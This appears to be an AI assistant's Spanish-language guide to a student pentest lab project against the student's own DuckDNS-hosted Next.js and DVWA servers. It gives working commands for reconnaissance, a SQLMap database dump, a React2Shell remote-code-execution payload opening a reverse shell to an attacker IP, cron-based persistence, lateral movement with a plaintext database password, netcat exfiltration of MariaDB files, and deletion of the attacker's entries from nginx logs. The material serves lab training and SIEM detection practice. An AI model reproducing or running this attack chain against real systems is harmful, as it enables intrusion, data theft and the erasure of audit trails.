**Ítem #3 al Ítem #8**
---

### Paso 1: Ítem #3 - Reconocimiento con 5 Herramientas (Fase Ofensiva)

Para este ítem debes demostrar el uso de al menos 5 herramientas del temario orientadas a tus dominios reales de DuckDNS :

1. **Nmap:** Ejecuta un escaneo de puertos y detección de servicios HTTPS apuntando a tus subdominios DuckDNS :


```bash
nmap -sV -sC -Pn webinsegura1.duckdns.org

```


2. **Whois / DNSdumpster:** Captura el reconocimiento pasivo y el mapeo de registros DNS (como los registros TXT colocados para Let's Encrypt o el direccionamiento IP de DuckDNS).
3. **The Harvester:** Busca subdominios y correos en fuentes públicas :


```bash
theHarvester -d duckdns.org -b bing

```


4. **SpiderFoot:** Lanza un escaneo automatizado contra tu dominio para consolidar el mapeo de superficie de ataque en un dashboard gráfico.


5. **Script Python Propio:** Diseña un script ligero en Python (`recon_wan.py`) que compruebe que el puerto 443 responde y extraiga las cabeceras de seguridad HTTP (Ítem #15) de tu servidor de Nginx :


```python
import socket
import requests

# Verificar puerto 443 abierto
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(3)
resultado = s.connect_ex(('webinsegura1.duckdns.org', 443))
print(f"Puerto 443 abierto: {resultado == 0}")

# Consultar y mostrar las cabeceras HTTP expuestas
r = requests.get('https://webinsegura1.duckdns.org', verify=False)
for header, value in r.headers.items():
    print(f"{header}: {value}")

```



*Evidencia requerida:* Capturas de las terminales en tu Kali Linux ejecutando cada comando con la fecha y hora visibles y tu prompt personalizado.

---

### Paso 2: Ítem #4 - Análisis de Vulnerabilidades con CVE

El objetivo es realizar un escaneo automatizado e identificar vulnerabilidades concretas :

1. **Ejecución de OWASP ZAP / OpenVAS:** Escanea la dirección `webinsegura1.duckdns.org`. El resultado revelará el uso de versiones vulnerables de Next.js (`15.x / 16.x`) y React Server Components (`19.0.0`).


2. **Identificación de CVEs y Análisis CVSS:** En tu documentación, desglosa el análisis de estas dos vulnerabilidades críticas :


* **CVE-2025-55182 / CVE-2025-66478 (React2Shell):** Puntuación CVSS v3.1 de $10.0$ (Crítica). Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`.
* **Inyección SQL en DVWA:** Puntuación CVSS v3.1 de $7.5$ (Alta). Vector: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`.


3. **SSL Server Test:** Toma una captura de pantalla del análisis de cifrado TLS en tus dominios para verificar que Let's Encrypt se ha desplegado correctamente sobre HTTPS.



---

### Paso 3: Ítem #5 - Acceso Web Explotado (Vector 1: SQL Injection)

Este ataque se lanza contra la aplicación clásica DVWA o el backend vulnerable de tu aplicación moderna :

1. Accede a `https://webinsegura2.duckdns.org/vulnerabilities/sqli/` e intercepta la petición del parámetro `id` en Burp Suite.


2. Introduce el bypass lógico en la interfaz web de login o de búsqueda de usuarios: `' OR '1'='1`.


3. Usa **SQLMap** en Kali Linux para realizar la extracción de las bases de datos de MariaDB :


```bash
sqlmap -u "https://webinsegura2.duckdns.org/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=tu_sesion_cookie" --batch --dbs

```


4. **Monitorización SIEM:** El agente de Wazuh en la Raspberry Pi 5 detectará la inyección en `/var/log/nginx/access.log` y generará una alerta con el **Rule ID 31103** (Intento de Inyección SQL).
*Evidencia requerida:* Capturas de Burp Suite, la base de datos extraída en la terminal de Kali y la alerta disparada en el Dashboard de Wazuh.

---

### Paso 4: Ítem #6 - Acceso a Máquina Linux Explotado (Vector 2: RCE React2Shell)

Explotaremos la deserialización insegura del protocolo Flight en Next.js para tomar el control del servidor:

1. En tu Kali Linux, abre un puerto de escucha de Netcat :


```bash
nc -lvnp 4444

```


2. Lanza la carga útil (payload) maliciosa orientada a la deserialización de componentes de Next.js contra tu subdominio de producción:
```bash
curl -X POST -H "Content-Type: text/x-component" --data-binary $'1:I\n2:O{"command": "bash -c \'bash -i >& /dev/tcp/IP_PUBLICA_ATACANTE/4444 0>&1\'"}' https://webinsegura1.duckdns.org/api/rsc -k

```


*(Debes reemplazar `IP_PUBLICA_ATACANTE` por la dirección IP WAN real de tu Kali Linux).*
3. Al procesar la petición, el backend de Node.js de la Raspberry Pi 5 resolverá de manera insegura la deserialización, importará el módulo nativo `child_process` y te devolverá una consola reversa con privilegios de contenedor.
4. **Monitorización SIEM:** Este ataque escribirá un evento de auditoría en tu archivo `/var/log/app/security.json` que el agente de Wazuh enviará al servidor Ubuntu, disparando la regla local XML de severidad crítica **Rule ID 100503** (React2Shell Explotado).
*Evidencia requerida:* Captura de la terminal de Netcat mostrando la ejecución del comando `whoami` (con salida `node` o `root`) y la alerta crítica roja de Wazuh en el dashboard de Ubuntu.



---

### Paso 5: Ítem #7 - Post-Explotación Documentada

Una vez que has comprometido la terminal del contenedor Next.js, debes realizar y documentar las cuatro técnicas estándar de post-explotación :

1. **Persistencia:** Inyecta un cronjob dentro del contenedor para forzar la reconexión periódica de la shell reversa hacia tu Kali :


```bash
(crontab -l ; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/IP_PUBLICA_ATACANTE/4444 0>&1'") | crontab -

```


2. **Movimiento Lateral (Pivoteo):** Conéctate internamente al host de base de datos MariaDB (`172.30.0.5`), el cual solo es visible en la red interna `backend_net` de Docker y no tiene acceso desde la WAN :


```bash
mysql -h 172.30.0.5 -u db_modern_user -pInsecureAIPassword_123 -e "SHOW DATABASES; USE lab_modern_db; SELECT * FROM users;"

```


3. **Exfiltración de Datos:** Empaqueta la tabla de credenciales y envíala a través de un canal TCP hacia un puerto de escucha en tu máquina Kali :


```bash
tar -czf - /var/lib/mysql | nc IP_PUBLICA_ATACANTE 5555

```


4. **Limpieza de Huellas (Covering Tracks):** Demuestra tus habilidades defensivas y forenses editando el archivo `/var/log/nginx/access.log` para eliminar las entradas correspondientes a la dirección IP de tu máquina de Kali atacante :


```bash
sed -i '/IP_PUBLICA_ATACANTE/d' /var/log/nginx/access.log

```



*Evidencia requerida:* Terminales del contenedor mostrando el cronjob configurado, la conexión a la base de datos de pivote y los comandos de limpieza de logs.

---

### Paso 6: Ítem #8 - Informe de Pentest Redactado

Debes unificar todas las evidencias recopiladas en un reporte profesional siguiendo los estándares PTES y OSSTMM. Este informe debe incluir:

* Un **Resumen Ejecutivo** diseñado para un CISO.


* La **Metodología** de ejecución (reconocimiento pasivo/activo, análisis de vulnerabilidades, explotación, post-explotación).


* El **Desglose de Hallazgos** técnicos ordenados por severidad crítica según la escala **CVSS v3.1**, detallando la descripción, pruebas de concepto y la remediación recomendada (por ejemplo, actualizar las dependencias de Next.js a la versión `15.5.7` o posterior).

---

### ¿Cómo proceder ahora?

Al lanzar estos ataques a través de tu red WAN perimetral, estarás generando de forma paralela los logs necesarios para consolidar los entregables de Blue Team y SOC (como el **Ítem #17: SIEM unificado** e **Ítem #18: Alerta disparada** en Wazuh).

Dime si estás listo para realizar las detonaciones ofensivas o si necesitas que detallemos los aspectos del bloque de **Desarrollo Seguro (SAST/DAST y modelado STRIDE)** para que completes las fases del ciclo DevSecOps en tu Raspberry Pi.